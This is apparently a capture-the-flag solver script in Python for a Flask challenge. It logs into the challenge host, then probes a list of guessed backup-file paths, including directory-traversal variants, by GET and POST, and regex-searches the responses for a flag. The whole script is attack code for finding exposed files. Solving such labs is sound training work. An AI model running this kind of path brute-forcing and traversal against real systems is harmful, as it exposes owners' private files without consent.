import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 暴力破解备份文件")
print(f"[*] Target: {BASE_URL}")
print()

# 登录
uid = "3553c1effa0b4698895a4874cfbd86d8"
session.post(f"{BASE_URL}/login", data={"uid": uid})

# 尝试所有可能的备份文件
print("[*] 尝试所有可能的备份文件路径")

backup_paths = [
    # 基本路径
    "/backup",
    "/backup.zip",
    "/backup.txt",
    "/backup/",
    # admin 路径
    "/admin/backup",
    "/admin/backup.zip",
    "/admin/backup.txt",
    "/admin/backup/",
    "/adminbackup",
    "/adminbackup.zip",
    "/adminbackup.txt",
    # static 路径
    "/static/backup",
    "/static/backup.zip",
    "/static/backup.txt",
    "/static/backup/",
    # 目录遍历
    "/../backup",
    "/../backup.zip",
    "/../backup.txt",
    "/static/../backup",
    "/static/../backup.zip",
    "/static/../backup.txt",
    # 其他可能的路径
    "/download/backup",
    "/download/backup.zip",
    "/download/backup.txt",
    "/download",
    "/uploads/backup",
    "/uploads/backup.zip",
    "/uploads/backup.txt",
    "/files/backup",
    "/files/backup.zip",
    "/files/backup.txt",
    "/temp/backup",
    "/temp/backup.zip",
    "/temp/backup.txt",
]

for path in backup_paths:
    resp = session.get(f"{BASE_URL}{path}")
    if resp.status_code != 404:
        print(f"    [+] {path}: {resp.status_code}")
        print(f"    {resp.text[:500]}")
        
        if "flag" in resp.text.lower() or "ctf" in resp.text.lower():
            print(f"    [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] Flag: {flag_match.group()}")

print()

# 尝试 POST
print("[*] 尝试 POST 访问备份")

post_paths = [
    "/backup",
    "/admin/backup",
    "/api/backup",
]

for path in post_paths:
    resp = session.post(f"{BASE_URL}{path}")
    if resp.status_code != 404 and resp.status_code != 405:
        print(f"    [+] POST {path}: {resp.status_code}")
        print(f"    {resp.text[:500]}")
        
        if "flag" in resp.text.lower() or "ctf" in resp.text.lower():
            print(f"    [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] Flag: {flag_match.group()}")

print()

print("[*] 测试完成")
